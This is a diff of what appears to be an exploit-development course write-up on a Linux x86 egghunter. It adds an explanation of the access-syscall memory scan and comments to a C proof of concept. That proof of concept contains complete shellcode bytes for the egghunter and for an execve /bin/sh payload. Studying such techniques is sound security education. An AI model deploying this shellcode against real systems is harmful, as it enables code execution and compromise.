@@ -101,9 +101,9 @@ test2:
   jnz test2
   jmp edi
 ```
-In this second shellcode the great difference is the "egg" comparison, because an IA32 native instruction named *scasd* is used in this case, allowing a small comparison.
+This code uses a "page size" of 4096 bytes (0x0fff + 0x0001 = 0x1000 or 4096) which is set in EDX register, EBX register contains the address to validate (current address of EDX plus 4) and EAX contains the value needed for the access system call (0x21). After the system call, EAX is compared with 0xf2 (which represents EFAULT), if the comparison is not met the address value is checked agaisnt the "egg" value twice, contained in EBX register (given the registers value is stored before the system call and restored before checking the address against the "egg" using *pusha* and *popa*).
 
-It is tested with the execve shellcode as payload:
+Finally, it is tested with the "execve" shellcode as payload:
 
 ![Screenshot](images/3.png)
 
@@ -111,15 +111,18 @@ It is tested with the execve shellcode as payload:
 
 ### POC code
 
-This is the code of *shellcode.c* for this exercise:
+This is the code of *shellcode.c* for this exercise, which :
 
 
 ```cpp
 #include <stdio.h>
 #include <string.h>
+// TAG or EGG is defined in here
 #define egg "\x90\x50\x90\x50"
 
+// unsigned char egghunter[] = EGGHUNTER
 unsigned char egghunter[] = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
+// unsigned char shellcode[] = egg egg PAYLOAD
 unsigned char shellcode[] = egg egg "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
 int main() {
